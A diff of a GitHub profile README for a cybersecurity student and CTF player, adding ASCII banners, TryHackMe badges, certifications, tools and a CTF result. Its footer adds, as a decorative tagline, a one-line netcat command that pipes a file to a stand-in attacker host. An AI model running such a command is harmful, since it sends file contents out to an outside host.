@@ -1,54 +1,116 @@
-<h1 align="center">Hi, I'm Harshil Bhuva 👋</h1>
-<h3 align="center">Cybersecurity Enthusiast | Aspiring Penetration Tester | Building Skills to Break & Defend</h3>
+```text
+╔══════════════════════════════════════════════════════════════════════════════╗
+║   ███╗   ██╗███████╗██╗  ██╗████████╗    ██╗   ██╗███╗   ██╗ ██████╗ ██╗  ██╗ ║
+║   ████╗  ██║██╔════╝╚██╗██╔╝╚══██╔══╝    ██║   ██║████╗  ██║██╔════╝ ██║  ██║ ║
+║   ██╔██╗ ██║█████╗   ╚███╔╝    ██║       ██║   ██║██╔██╗ ██║██║  ███╗███████║ ║
+║   ██║╚██╗██║██╔══╝   ██╔██╗    ██║       ╚██╗ ██╔╝██║╚██╗██║██║   ██║██╔══██║ ║
+║   ██║ ╚████║███████╗██╔╝ ██╗   ██║        ╚████╔╝ ██║ ╚████║╚██████╔╝██║  ██║ ║
+║   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝         ╚═══╝  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝ ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+```
+
+<div align="center">
+
+```text
+> whoami
+> Harshil Bhuva
+> Role: CTF Player | Penetration Tester | Red Team Aspirant
+> Location: Gujarat, India
+```
+
+<br>
+
+[![HitCount](https://hits.dwyl.com/HarshilBhuva/HarshilBhuva.svg?style=flat-square&show=unique)](https://github.com/HarshilBhuva/HarshilBhuva)
+[![GitHub Followers](https://img.shields.io/github/followers/HarshilBhuva?style=flat-square&color=00ff41&label=followers&logo=github)](https://github.com/HarshilBhuva?tab=followers)
+[![GitHub Stars](https://img.shields.io/github/stars/HarshilBhuva?style=flat-square&color=00ff41)](https://github.com/HarshilBhuva?tab=repositories)
+[![GitHub Following](https://img.shields.io/github/following/HarshilBhuva?style=flat-square&color=00ff41)](https://github.com/HarshilBhuva?tab=following)
+
+</div>
+
+---
+
+<div align="center">
+
+### `tryhackme`
+
+[![TryHackMe](https://tryhackme-badges.s3.amazonaws.com/COMMANDER.png)](https://tryhackme.com/p/COMMANDER)
+
+[![90-Day Streak](https://assets.tryhackme.com/img/badges/streak90.svg)](https://tryhackme.com/COMMANDER/badges/90-day-streak)
+[![Network Fundamentals](https://assets.tryhackme.com/img/badges/networkfundamentals.png)](https://tryhackme.com/COMMANDER/badges/network-fundamentals)
+[![Diamond League](https://github.com/user-attachments/assets/e3005450-2d10-4311-869d-fe7a095449e4)](https://tryhackme.com/COMMANDER/badges/diamond-league)
+[![SQL Slayer](https://assets.tryhackme.com/img/badges/injection.png)](https://tryhackme.com/COMMANDER/badges/sql-slayer)
+
+</div>
+
+---
+
+```text
+╭────────────────────────── CERTIFICATIONS ──────────────────────────╮
+│                                                                    │
+│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
+│  │  CCNA        │  │  SOC Ops     │  │  Ethical     │             │
+│  │  Cisco       │  │  Cisco       │  │  Hacker      │             │
+│  └──────────────┘  └──────────────┘  └──────────────┘             │
+│                                                                    │
+│  ┌──────────────┐  ┌──────────────┐                               │
+│  │  Pre-Security│  │  Endpoint    │                               │
+│  │  TryHackMe   │  │  Security    │                               │
+│  │              │  │  Cisco       │                               │
+│  └──────────────┘  └──────────────┘                               │
+╰────────────────────────────────────────────────────────────────────╯
+```
+
+---
+
+```text
+╭────────────────────────── SKILLS ────────────────────────────────╮
+│                                                                    │
+│  ⚔ Offensive Security                                            │
+│     Reconnaissance  •  Vulnerability Assessment  •  Web Exploitation                │
+│     CTF  •  Burp Suite  •  Nmap  •  Hydra  •  Wireshark                              │
+│                                                                    │
+│  🐍 Languages                                                      │
+│     Python  •  Bash  •  SQL  •  JavaScript                                    │
+│                                                                    │
+│  🛠 Tools & Platforms                                                │
+│     Burp Suite  •  Nmap  •  Hydra  •  Wireshark  •  VS Code                               │
+│     GitHub Actions  •  Docker                                          │
+│                                                                    │
+│  🖥 Infrastructure                                                   │
+│     Linux  •  AWS  •  Firebase                                           │
+│                                                                    │
+╰────────────────────────────────────────────────────────────────────╯
+```
+
+---
+
+```text
+╭────────────────────────── ACHIEVEMENTS ──────────────────────────╮
+│                                                                    │
+│  🏆  BREACH POINT CTF 2026                                        │
+│     Top 50 National Finalist — 24hr CTF at Malla Reddy University  │
+│     Cleared Online Qualifier (Top 50) → Competed in Offline Final  │
+│                                                                    │
+╰────────────────────────────────────────────────────────────────────╯
+```
+
+---
+
+<div align="center">
+
+### `connect`
+
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/harshil-bhuva184/)
+[![TryHackMe](https://img.shields.io/badge/TryHackMe-%2312BFDA?style=flat-square&logo=tryhackme&logoColor=white)](https://tryhackme.com/p/COMMANDER)
+[![GitHub](https://img.shields.io/badge/GitHub-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/HarshilBhuva)
+
+</div>
+
+---
 
 <p align="center">
-🌱 Currently learning <strong>Web Penetration Testing using OWASP Juice Shop </strong>
+  <sub>🟢 Currently hunting vulnerabilities & grinding THM rooms</sub>
 </p>
-
-<hr/>
-
-<h3 align="center">🛡️ Cybersecurity Practices</h3>
-
 <p align="center">
-  <a href="https://tryhackme.com/p/COMMANDER" target="_blank">
-<img src="https://tryhackme-badges.s3.amazonaws.com/COMMANDER.png?cachE=2026-03-28" alt="TryHackMe Badge" />
-   <!-- change cache=20yy-mm each time to get it right -->
-  </a>
-</p>
-<p align="center">
- <a href="https://tryhackme.com/COMMANDER/badges/90-day-streak?utm_campaign=social_share&utm_medium=social&utm_content=badge&utm_source=copy&sharerId=6725fe52cf0dbd27420aa137"  target="_blank"
-     style="text-decoration:none; border:none; outline:none; display:inline-block;">
-    <img src="https://assets.tryhackme.com/img/badges/streak90.svg" height="100" alt="30 Day Streak Badge">
-  </a>
-   <a href="https://tryhackme.com/COMMANDER/badges/network-fundamentals?utm_campaign=social_share&utm_medium=social&utm_content=badge&utm_source=copy&sharerId=6725fe52cf0dbd27420aa137"  target="_blank"
-     style="text-decoration:none; border:none; outline:none; display:inline-block;">
-    <img src="https://assets.tryhackme.com/img/badges/networkfundamentals.png" height="100" alt="30 Day Streak Badge">
-  </a>
-  <a href="https://tryhackme.com/COMMANDER/badges/diamond-league?utm_campaign=social_share&utm_medium=social&utm_content=badge&utm_source=copy&sharerId=6725fe52cf0dbd27420aa137"      target="_blank"
-     style="text-decoration:none; border:none; outline:none; display:inline-block;">
-    <img src="https://github.com/user-attachments/assets/e3005450-2d10-4311-869d-fe7a095449e4" height="100" alt="Diamond League">
-  </a>
-  <a href="https://tryhackme.com/COMMANDER/badges/sql-slayer?utm_campaign=social_share&utm_medium=social&utm_content=badge&utm_source=copy&sharerId=6725fe52cf0dbd27420aa137"      target="_blank"
-     style="text-decoration:none; border:none; outline:none; display:inline-block;">
-    <img src="https://assets.tryhackme.com/img/badges/injection.png" height="100" alt="SQL Slayer Badge"/>
-  </a>
-</p>
-<hr/>
-
-<h3 align="center">🧰 Languages & Tools</h3>
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/linux/linux-original.svg" width="40"/>
-  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/66704dd0e54a1f39bff7b1a1-1735574256490" width="40"/>
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" width="40"/>
-  <img src="https://www.vectorlogo.zone/logos/git-scm/git-scm-icon.svg" width="40"/>
-  <img src="https://cdnjs.cloudflare.com/ajax/libs/simple-icons/15.15.0/burpsuite.svg" width="40"/>
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/mysql/mysql-original-wordmark.svg" width="40"/>
-  <img src="https://www.vectorlogo.zone/logos/figma/figma-icon.svg" width="40"/>
-  <img src="https://www.vectorlogo.zone/logos/firebase/firebase-icon.svg" width="40"/>
-  <img src="https://www.vectorlogo.zone/logos/flutterio/flutterio-icon.svg" width="40"/>
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/vscode/vscode-original.svg" width="40"/>
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/html5/html5-original-wordmark.svg" width="40"/>
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/css3/css3-original-wordmark.svg" width="40"/>
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/php/php-original.svg" width="40"/>
+  <sub>``cat flag /dev/null | nc attacker.com 1337``</sub>
 </p>
